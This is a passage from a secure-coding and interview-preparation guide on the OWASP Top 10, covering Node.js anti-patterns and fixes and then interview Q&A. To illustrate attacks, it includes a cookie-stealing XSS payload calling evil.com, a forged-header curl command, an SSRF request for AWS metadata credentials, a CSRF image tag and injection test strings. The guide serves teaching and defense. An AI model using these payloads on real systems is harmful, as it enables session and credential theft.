
// WHY THIS FAILS:
// - Arbitrary code execution
// - Can access Node.js APIs
// - vm module is NOT a security sandbox

// ✅ CORRECT: Use safe alternatives

// For math: use a math parser library
import { evaluate } from 'mathjs';

app.post('/api/calculate', (req, res) => {
    const { formula } = req.body;
    
    // mathjs safely evaluates math expressions
    try {
        const result = evaluate(formula);
        res.json({ result });
    } catch {
        res.status(400).json({ error: 'Invalid formula' });
    }
});

// For templates: use a safe template engine
import Handlebars from 'handlebars';

// Handlebars escapes by default
const template = Handlebars.compile('Hello {{name}}');
const result = template({ name: userInput });

// For JSON: use JSON.parse (not eval)
const data = JSON.parse(jsonString);  // Safe
// NOT: eval('(' + jsonString + ')');  // Dangerous
```

### Mistake 6: Trusting Client Headers

```typescript
// ════════════════════════════════════════════════════════════════════════════
// COMMON MISTAKE 6: TRUSTING CLIENT HEADERS
// ════════════════════════════════════════════════════════════════════════════

// ❌ Trusting X-Forwarded-For for security decisions
app.get('/api/admin', (req, res) => {
    const ip = req.headers['x-forwarded-for'];
    if (ip === '10.0.0.1') {  // "Internal" IP
        return res.json(adminData);
    }
    res.status(403).json({ error: 'Forbidden' });
});

// ATTACK:
// curl -H "X-Forwarded-For: 10.0.0.1" https://api.example.com/api/admin
// Result: Admin access!

// ❌ Trusting custom auth headers without validation
app.use((req, res, next) => {
    if (req.headers['x-admin'] === 'true') {
        req.isAdmin = true;
    }
    next();
});

// WHY THIS FAILS:
// - HTTP headers are controlled by client
// - Proxies can be misconfigured
// - Attackers easily forge headers

// ✅ CORRECT: Only trust headers from known proxies

// Configure trusted proxies (Express)
app.set('trust proxy', ['10.0.0.0/8', '172.16.0.0/12']);

// Now req.ip comes from trusted proxy's X-Forwarded-For
// NOT directly from client header

// For authentication: use signed tokens, not headers
app.use(authenticate);  // Validates JWT signature

// Rate limiting with proper IP detection
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    // Use express's trust proxy setting
    keyGenerator: (req) => req.ip  // After trust proxy processing
});
```

### Mistake 7: Race Conditions in Security Checks

```typescript
// ════════════════════════════════════════════════════════════════════════════
// COMMON MISTAKE 7: RACE CONDITIONS (TOCTOU)
// ════════════════════════════════════════════════════════════════════════════

// ❌ Time-of-check to time-of-use vulnerability
app.post('/api/transfer', async (req, res) => {
    const { amount, toUserId } = req.body;
    
    // CHECK: Get current balance
    const user = await db.users.findById(req.user.id);
    
    // VULNERABLE WINDOW: Another request could modify balance here!
    
    if (user.balance >= amount) {
        // USE: Deduct balance
        await db.users.update({
            where: { id: req.user.id },
            data: { balance: user.balance - amount }  // Uses stale value!
        });
        
        await db.users.update({
            where: { id: toUserId },
            data: { balance: { increment: amount } }
        });
    }
});

// ATTACK:
// User has $100 balance
// Send 100 concurrent requests to transfer $100
// All 100 checks pass (balance was $100)
// All 100 transfers execute
// Result: $10,000 transferred from $100 balance!

// ✅ CORRECT: Use database transactions with row locking

// PostgreSQL with Prisma
app.post('/api/transfer', async (req, res) => {
    const { amount, toUserId } = req.body;
    
    try {
        await prisma.$transaction(async (tx) => {
            // Lock the row for update
            const user = await tx.$queryRaw`
                SELECT * FROM users WHERE id = ${req.user.id} FOR UPDATE
            `;
            
            if (user[0].balance < amount) {
            throw new Error('Insufficient balance');
        }
        
            // Now safe to update
        await tx.users.update({
            where: { id: req.user.id },
            data: { balance: { decrement: amount } }
        });
        
        await tx.users.update({
            where: { id: toUserId },
            data: { balance: { increment: amount } }
        });
        }, {
            isolationLevel: 'Serializable'  // Highest isolation
        });
        
        res.json({ success: true });
    } catch (error) {
        if (error.message === 'Insufficient balance') {
            return res.status(400).json({ error: 'Insufficient balance' });
        }
        throw error;
    }
});

// Alternative: Atomic update with condition
await db.users.updateMany({
    where: {
        id: req.user.id,
        balance: { gte: amount }  // Condition in WHERE
    },
    data: {
        balance: { decrement: amount }
    }
});
// Check if update affected any rows
```

---

## Security Anti-Patterns

### Anti-Pattern 1: Rolling Your Own Crypto

```typescript
// ════════════════════════════════════════════════════════════════════════════
// ANTI-PATTERN 1: ROLLING YOUR OWN CRYPTO
// ════════════════════════════════════════════════════════════════════════════

// ❌ Custom "encryption"
function encrypt(text, key) {
    let result = '';
    for (let i = 0; i < text.length; i++) {
        result += String.fromCharCode(
            text.charCodeAt(i) ^ key.charCodeAt(i % key.length)
        );
    }
    return Buffer.from(result).toString('base64');
}

// ❌ Custom password hashing
function hashPassword(password, salt) {
    return crypto.createHash('md5').update(password + salt).digest('hex');
}

// ❌ Custom session tokens
function generateToken() {
    return Date.now().toString(36) + Math.random().toString(36);
}

// WHY THIS FAILS:
// - XOR cipher trivially broken
// - MD5 is cryptographically broken
// - Math.random() is predictable
// - You're not a cryptographer (and that's okay!)

// ✅ CORRECT: Use established libraries

// Encryption: Use crypto with proper modes
import crypto from 'crypto';

const algorithm = 'aes-256-gcm';
const key = crypto.randomBytes(32);

function encrypt(text: string): { encrypted: string; iv: string; tag: string } {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv(algorithm, key, iv);
    let encrypted = cipher.update(text, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return {
        encrypted,
        iv: iv.toString('base64'),
        tag: cipher.getAuthTag().toString('base64')
    };
}

// Password hashing: Use Argon2 or bcrypt
import argon2 from 'argon2';
const hash = await argon2.hash(password);

// Tokens: Use crypto.randomBytes
const token = crypto.randomBytes(32).toString('hex');
```

### Anti-Pattern 2: Catch-All Error Handlers That Leak Info

```typescript
// ════════════════════════════════════════════════════════════════════════════
// ANTI-PATTERN 2: VERBOSE ERROR RESPONSES
// ════════════════════════════════════════════════════════════════════════════

// ❌ Leaking everything
app.use((err, req, res, next) => {
    res.status(500).json({
        error: err.message,
        stack: err.stack,
        sql: err.sql,  // SQL query!
        code: err.code,
        errno: err.errno,
        path: err.path,
        syscall: err.syscall
    });
});

// ❌ Different responses reveal information
app.post('/api/login', async (req, res) => {
    const user = await db.users.findByEmail(req.body.email);
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    if (!await verifyPassword(req.body.password, user.passwordHash)) {
        return res.status(401).json({ error: 'Invalid password' });
    }
    // ...
});
// Attacker learns: "User not found" vs "Invalid password"
// Can enumerate valid email addresses

// ✅ CORRECT: Generic errors, detailed logging

app.post('/api/login', async (req, res) => {
    const user = await db.users.findByEmail(req.body.email);
    
    // Always use same error message
    const genericError = { error: 'Invalid email or password' };
    
    if (!user) {
        // Log for debugging
        logger.debug('Login failed: user not found', { email: req.body.email });
        return res.status(401).json(genericError);
    }
    
    if (!await verifyPassword(req.body.password, user.passwordHash)) {
        logger.debug('Login failed: invalid password', { userId: user.id });
        return res.status(401).json(genericError);
    }
    
    // Success
});
```

### Anti-Pattern 3: Storing Sensitive Data in JWT

```typescript
// ════════════════════════════════════════════════════════════════════════════
// ANTI-PATTERN 3: SENSITIVE DATA IN JWT
// ════════════════════════════════════════════════════════════════════════════

// ❌ Too much data in JWT
const token = jwt.sign({
    userId: user.id,
    email: user.email,
    role: user.role,
    ssn: user.ssn,           // PII in JWT!
    creditCard: user.card,   // Financial data!
    passwordHash: user.pass  // Never!
}, secret);

// WHY THIS FAILS:
// - JWTs are signed, NOT encrypted (by default)
// - Anyone can decode: jwt.io
// - Stored in localStorage/cookies, easily accessed
// - Can't revoke - data lives until expiry

// ✅ CORRECT: Minimal claims, lookup sensitive data

const token = jwt.sign({
    sub: user.id,           // Subject (user ID)
    jti: crypto.randomUUID(), // Unique token ID (for revocation)
    iat: Date.now(),
    exp: Date.now() + 3600000  // 1 hour
}, secret, { algorithm: 'HS256' });

// When you need user details, fetch from database
async function getCurrentUser(req: Request) {
    const userId = req.user.sub;  // From JWT
    return db.users.findById(userId, {
        select: { id: true, email: true, role: true, name: true }
    });
}
```

---

## When NOT to Implement Security Measures

### When NOT to Use Custom Solutions

```typescript
// ════════════════════════════════════════════════════════════════════════════
// WHEN NOT TO IMPLEMENT YOURSELF
// ════════════════════════════════════════════════════════════════════════════

/*
DON'T BUILD YOUR OWN:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  ❌ Authentication system                                                   │
│     → Use: Auth0, Clerk, NextAuth.js, Passport.js                         │
│                                                                             │
│  ❌ Encryption algorithms                                                   │
│     → Use: Node's crypto module, libsodium                                │
│                                                                             │
│  ❌ Password hashing                                                        │
│     → Use: Argon2, bcrypt libraries                                       │
│                                                                             │
│  ❌ JWT implementation                                                      │
│     → Use: jsonwebtoken, jose libraries                                   │
│                                                                             │
│  ❌ CSRF protection                                                         │
│     → Use: csurf, built-in framework features                             │
│                                                                             │
│  ❌ Rate limiting                                                           │
│     → Use: express-rate-limit, Redis-based solutions                      │
│                                                                             │
│  ❌ HTML sanitization                                                       │
│     → Use: DOMPurify, sanitize-html                                       │
│                                                                             │
│  ❌ Security headers                                                        │
│     → Use: Helmet                                                         │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘

WHY:
- Security is hard to get right
- Edge cases are non-obvious
- Battle-tested libraries have years of fixes
- Security researchers audit popular libraries
- Your time is better spent on business logic
*/
```

### When Simpler is More Secure

```typescript
// ════════════════════════════════════════════════════════════════════════════
// WHEN SIMPLER IS MORE SECURE
// ════════════════════════════════════════════════════════════════════════════

// ❌ Over-engineered: Custom encryption for user preferences
const encryptedPrefs = encrypt(JSON.stringify(preferences), key);
await db.users.update({ 
    where: { id: userId }, 
    data: { preferences: encryptedPrefs } 
});

// ✅ Simpler: Just store it (if not sensitive)
await db.users.update({
    where: { id: userId },
    data: { preferences }  // Theme, language, etc. - not sensitive
});

// ──────────────────────────────────────────────────────────────────────────

// ❌ Over-engineered: Complex permission system for simple app
const permissions = await checkRBAC(user, 'posts', 'read', {
    conditions: { status: 'published' },
    contextual: { time: Date.now() }
});

// ✅ Simpler: Basic role check
if (user.role === 'admin' || post.authorId === user.id) {
    // Allow
}

// ──────────────────────────────────────────────────────────────────────────

// ❌ Over-engineered: Custom auth for internal tool
// Building full OAuth2 + MFA for 5-user admin panel

// ✅ Simpler: Use VPN + basic auth, or managed auth service
// For internal tools with trusted users, complexity adds attack surface

// ──────────────────────────────────────────────────────────────────────────

/*
SIMPLICITY PRINCIPLES:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  1. Less code = fewer bugs = fewer vulnerabilities                        │
│  2. Standard solutions are better reviewed                                │
│  3. Complexity is the enemy of security                                   │
│  4. If you don't need it, don't build it                                  │
│  5. Use managed services when appropriate                                 │
│                                                                             │
│  ASK: "What's the simplest secure solution?"                              │
│  NOT: "What's the most sophisticated solution?"                           │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/
```

---

## Security Testing Checklist

```typescript
// ════════════════════════════════════════════════════════════════════════════
// SECURITY TESTING CHECKLIST
// ════════════════════════════════════════════════════════════════════════════

/*
PRE-DEPLOYMENT SECURITY CHECKLIST:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  □ AUTHENTICATION                                                          │
│    □ Password hashing uses Argon2/bcrypt                                  │
│    □ Session tokens are cryptographically random                          │
│    □ JWT algorithm is explicitly specified (not "none")                   │
│    □ Rate limiting on login/registration                                  │
│    □ Account lockout after failed attempts                                │
│    □ Password reset is secure (random tokens, expiry)                     │
│                                                                             │
│  □ AUTHORIZATION                                                           │
│    □ Every endpoint has authorization check                               │
│    □ IDOR testing (can user A access user B's data?)                     │
│    □ Role-based checks on backend, not just frontend                      │
│    □ Admin functions require re-authentication                            │
│                                                                             │
│  □ INPUT VALIDATION                                                        │
│    □ All inputs validated server-side                                     │
│    □ Parameterized queries (no SQL concatenation)                        │
│    □ File uploads validated (type, size, name)                           │
│    □ JSON schema validation (Zod, Joi)                                   │
│                                                                             │
│  □ OUTPUT ENCODING                                                         │
│    □ HTML escaped (or React's default)                                   │
│    □ JSON responses don't include sensitive fields                       │
│    □ Error messages don't leak internal details                          │
│                                                                             │
│  □ TRANSPORT SECURITY                                                      │
│    □ HTTPS enforced (HTTP redirects)                                     │
│    □ HSTS header set                                                      │
│    □ Cookies: Secure, HttpOnly, SameSite                                 │
│                                                                             │
│  □ HEADERS                                                                 │
│    □ CSP configured                                                       │
│    □ X-Content-Type-Options: nosniff                                     │
│    □ X-Frame-Options: DENY                                               │
│    □ CORS properly configured (not *)                                    │
│                                                                             │
│  □ DEPENDENCIES                                                            │
│    □ npm audit shows no high/critical vulnerabilities                    │
│    □ Dependencies updated recently                                        │
│    □ Lock file committed                                                  │
│                                                                             │
│  □ SECRETS                                                                 │
│    □ No hardcoded secrets in code                                        │
│    □ .env files in .gitignore                                            │
│    □ Production secrets in secrets manager                               │
│    □ Different secrets per environment                                   │
│                                                                             │
│  □ LOGGING                                                                 │
│    □ Security events logged                                              │
│    □ No sensitive data in logs                                           │
│    □ Logs monitored for anomalies                                        │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

// Automated security testing script
async function securityAudit() {
    const results = {
        passed: [],
        failed: [],
        warnings: []
    };
    
    // Check 1: Environment variables
    const requiredEnv = ['JWT_SECRET', 'DATABASE_URL', 'SESSION_SECRET'];
    for (const env of requiredEnv) {
        if (!process.env[env]) {
            results.failed.push(`Missing ${env}`);
        } else if (process.env[env].length < 32) {
            results.warnings.push(`${env} should be at least 32 characters`);
        } else {
            results.passed.push(`${env} configured`);
        }
    }
    
    // Check 2: Security headers
    const response = await fetch('https://myapp.com');
    const headers = response.headers;
    
    const requiredHeaders = [
        'strict-transport-security',
        'content-security-policy',
        'x-content-type-options',
        'x-frame-options'
    ];
    
    for (const header of requiredHeaders) {
        if (headers.has(header)) {
            results.passed.push(`Header: ${header}`);
        } else {
            results.failed.push(`Missing header: ${header}`);
        }
    }
    
    // Check 3: npm audit
    const { execSync } = require('child_process');
    try {
        execSync('npm audit --audit-level=high', { stdio: 'pipe' });
        results.passed.push('No high/critical vulnerabilities');
    } catch {
        results.failed.push('npm audit found high/critical vulnerabilities');
    }
    
    return results;
}
```

---

*Part 5 Complete. Continue to Part 6 for Comprehensive Interview Q&A.*

# OWASP Top 10 - Part 6: Comprehensive Interview Q&A

## Fundamental Questions

### Q1: "What is the OWASP Top 10 and why does it matter?"

> **Answer:** "The OWASP Top 10 is the industry-standard awareness document for web application security, listing the most critical security risks based on data from hundreds of organizations worldwide. The 2021 list includes:
>
> 1. **Broken Access Control** (#1, affects 94% of apps) - Users accessing unauthorized resources
> 2. **Cryptographic Failures** - Weak encryption, exposed secrets
> 3. **Injection** - SQL, NoSQL, Command injection
> 4. **Insecure Design** - Security flaws in architecture
> 5. **Security Misconfiguration** - Default credentials, verbose errors
> 6. **Vulnerable Components** - Outdated dependencies with CVEs
> 7. **Authentication Failures** - Weak passwords, session issues
> 8. **Integrity Failures** - CI/CD attacks, insecure deserialization
> 9. **Logging Failures** - Missing audit trails
> 10. **SSRF** - Server fetching attacker-controlled URLs
>
> It matters because these represent the most common attack vectors. Address these, and you've eliminated the majority of realistic threats. It's also commonly referenced in compliance frameworks and security audits."

---

### Q2: "Explain the difference between authentication and authorization. How do failures in each manifest?"

> **Answer:** "**Authentication** verifies WHO you are - proving identity through:
> - Knowledge factors (password)
> - Possession factors (phone, hardware key)
> - Biometric factors (fingerprint)
>
> **Authorization** determines WHAT you can do - checking permissions for resources and actions.
>
> **Authentication Failures** (A07):
> - Credential stuffing attacks
> - Weak password policies
> - Session fixation
> - Missing MFA
>
> **Authorization Failures** (A01):
> - IDOR - accessing another user's invoice by changing the ID
> - Privilege escalation - regular user accessing admin endpoints
> - Missing function-level checks
>
> A common vulnerability is checking authentication but not authorization: 'Yes, you're logged in, but can you access THIS specific resource?' That's the essence of Broken Access Control."

---

### Q3: "How do you prevent SQL injection?"

> **Answer:** "The core principle is **never concatenate user input into SQL queries**. Defense layers:
>
> **1. Parameterized Queries (Primary Defense):**
> ```javascript
> // NEVER: `SELECT * FROM users WHERE id = ${userId}`
> // ALWAYS: 
> const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);
> ```
>
> **2. ORMs (Additional Safety):**
> ORMs like Prisma, TypeORM handle parameterization automatically.
>
> **3. Input Validation (Defense in Depth):**
> Validate types, lengths, formats using Zod or Joi.
>
> **4. Least Privilege:**
> Database user should only have necessary permissions, not DROP or GRANT.
>
> **5. For Dynamic Identifiers:**
> When you need dynamic column/table names (can't parameterize), use strict allowlists:
> ```javascript
> const ALLOWED_COLUMNS = ['name', 'email', 'created_at'];
> if (!ALLOWED_COLUMNS.includes(sortBy)) throw new Error('Invalid');
> ```
>
> **Edge Case:** Second-order injection - malicious input stored safely, then used unsafely later. Always parameterize, even for data from your own database."

---

## Intermediate Questions

### Q4: "Explain the three types of XSS and how to prevent each"

> **Answer:** "**Stored XSS** - Most dangerous. Malicious script saved to database, executes when ANY user views it.
> - Example: Comment containing `<script>fetch('evil.com/steal?c='+document.cookie)</script>`
> - Every user viewing the comment gets their session stolen
>
> **Reflected XSS** - Script in URL parameter reflected back.
> - Example: `/search?q=<script>alert(1)</script>`
> - Requires social engineering to trick victim into clicking
>
> **DOM-based XSS** - Client-side JS manipulates DOM unsafely.
> - Example: `document.innerHTML = location.hash`
> - No server involvement, harder to detect
>
> **Prevention:**
> 1. **Output Encoding** - Context-aware: HTML entities for HTML, JSON.stringify for JS
> 2. **React/Vue** - Use default escaping, avoid `dangerouslySetInnerHTML`
> 3. **CSP** - `script-src 'self'` blocks inline scripts; use nonces for exceptions
> 4. **HttpOnly Cookies** - Session tokens can't be accessed by JavaScript
> 5. **DOMPurify** - Sanitize HTML if you must allow rich text
>
> CSP is crucial defense-in-depth: even if XSS exists, CSP can prevent execution."

---

### Q5: "What is CSRF and how do SameSite cookies prevent it?"

> **Answer:** "**CSRF** (Cross-Site Request Forgery) tricks a user's browser into making authenticated requests to a site where they're logged in.
>
> **Attack Flow:**
> 1. User logs into bank.com (session cookie stored)
> 2. User visits evil.com while still logged in
> 3. evil.com contains: `<img src='https://bank.com/transfer?to=attacker&amount=10000'>`
> 4. Browser automatically includes bank.com cookies
> 5. Bank processes the transfer!
>
> **SameSite Cookie Defense:**
> - `SameSite=Strict`: Cookie never sent with cross-site requests. Attacker's site can't trigger authenticated requests.
> - `SameSite=Lax`: Cookie sent with top-level navigation (clicking links) but not with embedded requests (forms, images, AJAX).
> - `SameSite=None`: Always sent (requires `Secure` flag).
>
> **Recommendation:**
> - Use `Strict` for session cookies
> - Use `Lax` if links from external sites need to work
> - Combined with CSRF tokens for legacy browser support
>
> SameSite is now the primary CSRF defense, replacing traditional token-based approaches."

---

### Q6: "What is SSRF and why is it particularly critical in cloud environments?"

> **Answer:** "**SSRF** (Server-Side Request Forgery) tricks your server into making requests to unintended destinations.
>
> **Why Critical in Cloud:**
> Cloud providers expose metadata endpoints accessible only from within:
> - AWS: `http://169.254.169.254/latest/meta-data/`
> - This returns **IAM credentials** with full account access!
>
> **Attack Example:**
> ```
> POST /api/preview { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role' }
> ```
> Your server fetches this, returns AWS keys to attacker.
>
> **Real Impact:** Capital One breach (2019) - SSRF led to 100M+ customer records compromised.
>
> **Prevention:**
> 1. **URL Allowlisting** - Only allow specific domains
> 2. **Block Internal IPs** - 10.x, 172.16.x, 192.168.x, 169.254.x
> 3. **DNS Resolution Check** - Resolve hostname, verify IP isn't internal
> 4. **No Redirects** - Attacker could redirect to internal URL
> 5. **IMDSv2** - AWS metadata service v2 requires headers the attacker can't set
>
> Always validate and restrict outbound requests from your server."

---

## Advanced Questions

### Q7: "Walk me through conducting a security audit of an existing application"

> **Answer:** "Systematic approach following OWASP Testing Guide:
>
> **1. Reconnaissance (Understand the System):**
> - Review architecture documentation
> - Identify entry points (APIs, forms, file uploads)
> - Map tech stack, check for known CVEs
> - Review authentication/authorization model
>
> **2. Automated Scanning:**
> - OWASP ZAP or Burp Suite for common vulnerabilities
> - npm audit / Snyk for dependency vulnerabilities
> - CodeQL or Semgrep for SAST
>
> **3. Manual Testing by OWASP Top 10:**
> - **A01:** Change IDs in URLs, test IDOR, try accessing other users' data
> - **A02:** Check password storage, look for exposed secrets, verify TLS
> - **A03:** Test inputs with `'`, `';--`, `{\"$ne\":\"\"}`, `<script>`
> - **A05:** Check error responses, look for default credentials, review headers
> - **A10:** Test URL parameters that fetch external resources
>
> **4. Code Review:**
> - Search for `eval`, `exec`, SQL string concatenation
> - Review authentication/authorization middleware
> - Check for hardcoded secrets
>
> **5. Business Logic Testing:**
> - Can I skip checkout steps?
> - Race conditions in payments?
> - Negative quantity manipulation?
>
> **6. Documentation:**
> - Severity (CVSS score)
> - Proof of concept
> - Remediation steps
> - Retest after fixes"

---

### Q8: "How would you implement secure password reset?"

> **Answer:** "Password reset is a critical flow with multiple security considerations:
>
> **1. Request Phase:**
> - Rate limit per email AND per IP (3 attempts/hour)
> - Always return generic response: 'If email exists, reset sent'
> - Don't reveal if email exists (timing attacks)
> - Process asynchronously to prevent timing side-channels
>
> **2. Token Generation:**
> - Use `crypto.randomBytes(32)` - cryptographically random
> - Store HASH of token, not token itself
> - Set short expiry (1 hour max)
> - Invalidate previous tokens on new request
>
> **3. Token Delivery:**
> - Send via email to verified address
> - Token in email body, NOT in URL (URLs are logged, cached, in Referer)
> - Include warning: 'If you didn't request this...'
>
> **4. Reset Phase:**
> - Token submitted via POST body
> - Validate token hash against stored hash
> - Check expiry
> - Validate new password strength
> - Check against HaveIBeenPwned
>
> **5. Post-Reset:**
> - Invalidate ALL sessions for user
> - Send confirmation email
> - Log security event
> - Mark token as used (one-time use)
>
> Common mistakes: Predictable tokens, token in URL, no expiry, no session invalidation."

---

### Q9: "You discover a SQL injection vulnerability in production. Walk me through your response."

> **Answer:** "Incident response following severity of finding:
>
> **Immediate (First Hour):**
> 1. **Assess Scope:** What data is accessible? Authentication/user table? Financial data?
> 2. **Check for Exploitation:** Review logs for suspicious queries, unusual data access patterns
> 3. **Temporary Mitigation:**
>    - WAF rule to block the attack pattern
>    - Feature flag to disable vulnerable endpoint
>    - Maintenance mode if critical
>
> **Short-term (Same Day):**
> 4. **Fix:** Implement parameterized query, code review, test fix
> 5. **Deploy:** Emergency deployment with approval
> 6. **Verify:** Confirm fix blocks the attack
>
> **Investigation (24-48 Hours):**
> 7. **Forensics:** Analyze logs for:
>    - Union-based extraction attempts
>    - Time-based blind SQLi patterns
>    - Data exfiltration volume
> 8. **Impact Assessment:** What data was potentially accessed?
> 9. **Affected Users:** Identify accounts that may be compromised
>
> **Notification (As Required):**
> 10. **Legal/Compliance:** Determine breach notification requirements (GDPR: 72 hours)
> 11. **User Notification:** If data was exfiltrated
> 12. **Regulatory Bodies:** As required by law
>
> **Post-Incident:**
> 13. **Root Cause Analysis:** How did this pass code review?
> 14. **Process Improvements:** Add SAST scanning, SQLi-specific testing
> 15. **Codebase Audit:** Search for similar patterns elsewhere
> 16. **Documentation:** Full incident report
>
> Key principle: Assume breach until proven otherwise."

---

### Q10: "How do you balance security with developer experience and velocity?"

> **Answer:** "Security shouldn't be a bottleneck if implemented correctly:
>
> **1. Shift Left - Security in Development:**
> - IDE plugins for security linting
> - Pre-commit hooks for secrets detection
> - Security-focused code review checklists
> - Threat modeling in design phase
>
> **2. Automation - Remove Manual Steps:**
> - Automated dependency scanning (Dependabot, Snyk)
> - SAST in CI/CD pipeline (non-blocking warnings, blocking on critical)
> - Automated security testing in staging
>
> **3. Paved Roads - Make Secure Easy:**
> - Provide secure-by-default libraries (auth wrapper, input validation)
> - Template repositories with security configured
> - Central auth service rather than each team building their own
>
> **4. Pragmatic Prioritization:**
> - Focus on high-impact, high-likelihood risks
> - Not everything needs bank-level security
> - Risk-based approach: public marketing site vs. payment processing
>
> **5. Education Over Enforcement:**
> - Security champions in each team
> - Lunch-and-learn sessions on OWASP Top 10
> - Explain the 'why' behind requirements
>
> **6. Fast Feedback:**
> - Security scanning results in PR comments
> - Clear remediation guidance
> - Security team available for consultation, not just audit
>
> The goal is making the secure way the easy way. When secure defaults exist and tooling is good, security becomes invisible to developers."

---

## Scenario-Based Questions

### Q11: "A security researcher reports a vulnerability. How do you handle this?"

> **Answer:** "Responsible disclosure handling:
>
> **1. Acknowledgment (24 hours):**
> - Thank the researcher
> - Confirm receipt
> - Provide timeline for initial assessment
>
> **2. Triage (48-72 hours):**
> - Reproduce the vulnerability
> - Assess severity (CVSS scoring)
> - Determine if actively exploited
>
> **3. Communication:**
> - Keep researcher updated on progress
> - Discuss disclosure timeline (typically 90 days)
> - Negotiate if more time needed for complex fix
>
> **4. Remediation:**
> - Develop and test fix
> - Deploy to production
> - Verify fix with researcher if appropriate
>
> **5. Disclosure:**
> - Coordinate public disclosure timing
> - Credit researcher (if they want)
> - Publish security advisory with CVE if applicable
>
> **6. Recognition:**
> - Bug bounty payment if program exists
> - Hall of fame acknowledgment
> - Public thanks
>
> Key: Treat researchers as partners, not adversaries. They're helping you."

---

### Q12: "Design the authentication and authorization system for a multi-tenant SaaS application"

> **Answer:** "Multi-tenant auth requires careful isolation:
>
> **Authentication Layer:**
> 1. **Identity Provider:**
>    - Use managed service (Auth0, Clerk) for SSO, MFA, passwordless
>    - Support SAML/OIDC for enterprise SSO
>    - Per-tenant authentication policies
>
> 2. **Session/Token:**
>    - JWT with tenant claim: `{ sub: userId, tid: tenantId }`
>    - Short-lived access tokens (15 min)
>    - Refresh tokens with tenant binding
>    - Token includes minimal claims, fetch details from DB
>
> **Authorization Layer:**
> 1. **Tenant Isolation:**
>    - Every database query includes tenant filter
>    - Row-Level Security (RLS) in PostgreSQL as defense-in-depth
>    - Middleware validates tenant claim matches requested resource
>
> 2. **Role-Based Access (RBAC):**
>    - Roles are tenant-scoped: `tenant:admin`, `tenant:member`
>    - Permission checks: `can(user, 'posts:create', tenant)`
>    - Super-admin role for platform operations (separate from tenant roles)
>
> 3. **Resource Authorization:**
>    ```typescript
>    const post = await db.posts.findFirst({
>      where: {
>        id: postId,
>        tenantId: req.user.tenantId  // Tenant isolation
>      }
>    });
>    // Then check user can access this post within tenant
>    ```
>
> **Security Controls:**
> - Tenant switching requires re-authentication
> - Audit logging includes tenant context
> - Rate limiting per tenant
> - Data encryption per tenant (optional, for enterprise)
>
> **Cross-Tenant Protection:**
> - Never join across tenant boundaries without explicit authorization
> - Search/filter always scoped to tenant
> - Background jobs include tenant context"

---

## Quick-Fire Questions

### Q13: "What's the difference between encryption and hashing?"

> "**Encryption** is reversible - you can decrypt with a key. Used for data that needs to be read later (PII, messages).
>
> **Hashing** is one-way - you can't recover the original. Used for passwords and integrity verification.
>
> For passwords: Always hash (Argon2id), never encrypt. If you can decrypt passwords, so can attackers who steal your key."

---

### Q14: "Why shouldn't you use MD5 or SHA-1 for passwords?"

> "They're **too fast**. A GPU can compute billions of SHA-256 hashes per second. Argon2 is intentionally slow (and memory-hard), making brute force impractical.
>
> Also, MD5 and SHA-1 have known collision vulnerabilities, though that's less relevant for password hashing than the speed issue."

---

### Q15: "What is the principle of least privilege?"

> "Grant only the minimum permissions required for a task. A database user for a web app shouldn't have DROP TABLE or CREATE USER privileges. An API key for read operations shouldn't allow writes.
>
> If compromised, damage is limited. Applied to users, services, database accounts, IAM roles, file permissions, network access."

---

### Q16: "What's a timing attack and how do you prevent it?"

> "A timing attack extracts information from how long operations take. If password comparison returns early on first wrong character, attacker can guess character by character.
>
> Prevention: Use constant-time comparison functions. In Node.js: `crypto.timingSafeEqual()`. For auth responses, always take the same time whether user exists or not."

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    OWASP TOP 10 INTERVIEW CHEAT SHEET                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  A01 BROKEN ACCESS CONTROL                                                  │
│      • Check authorization on EVERY resource access                        │
│      • Never trust client-provided IDs/roles                               │
│      • Use 404 not 403 to avoid confirming resource exists                 │
│                                                                              │
│  A02 CRYPTOGRAPHIC FAILURES                                                 │
│      • Passwords: Argon2id or bcrypt (NEVER MD5/SHA for passwords)        │
│      • Data: AES-256-GCM for encryption                                    │
│      • HTTPS everywhere, HSTS header                                       │
│                                                                              │
│  A03 INJECTION                                                              │
│      • Parameterized queries, ALWAYS                                       │
│      • ORMs handle it automatically                                        │
│      • Allowlist for dynamic identifiers                                   │
│                                                                              │
│  A04 INSECURE DESIGN                                                        │
│      • Threat modeling in design phase                                     │
│      • Rate limiting, re-auth for sensitive ops                            │
│      • Server-side validation, never trust client                          │
│                                                                              │
│  A05 SECURITY MISCONFIGURATION                                              │
│      • Generic error messages in production                                │
│      • No default credentials                                              │
│      • Helmet for security headers                                         │
│                                                                              │
│  A06 VULNERABLE COMPONENTS                                                  │
│      • npm audit, Dependabot, Snyk                                         │
│      • Lock files committed                                                │
│      • SRI for CDN scripts                                                 │
│                                                                              │
│  A07 AUTHENTICATION FAILURES                                                │
│      • Strong password policy + MFA                                        │
│      • Rate limiting on login                                              │
│      • Secure session management                                           │
│                                                                              │
│  A08 INTEGRITY FAILURES                                                     │
│      • Verify signatures, secure CI/CD                                     │
│      • Don't deserialize untrusted data                                    │
│                                                                              │
│  A09 LOGGING FAILURES                                                       │
│      • Log security events (not sensitive data)                            │
│      • Monitor and alert on anomalies                                      │
│                                                                              │
│  A10 SSRF                                                                   │
│      • URL allowlisting                                                    │
│      • Block internal IP ranges                                            │
│      • Use IMDSv2 on AWS                                                   │
│                                                                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  DEFENSES:                                                                  │
│  • XSS → Output encoding, CSP, HttpOnly cookies                           │
│  • CSRF → SameSite cookies, CSRF tokens                                   │
│  • SQLi → Parameterized queries                                           │
│  • Auth → Argon2, MFA, rate limiting                                      │
│                                                                              │
│  PRINCIPLES:                                                                │
│  • Defense in depth (multiple layers)                                      │
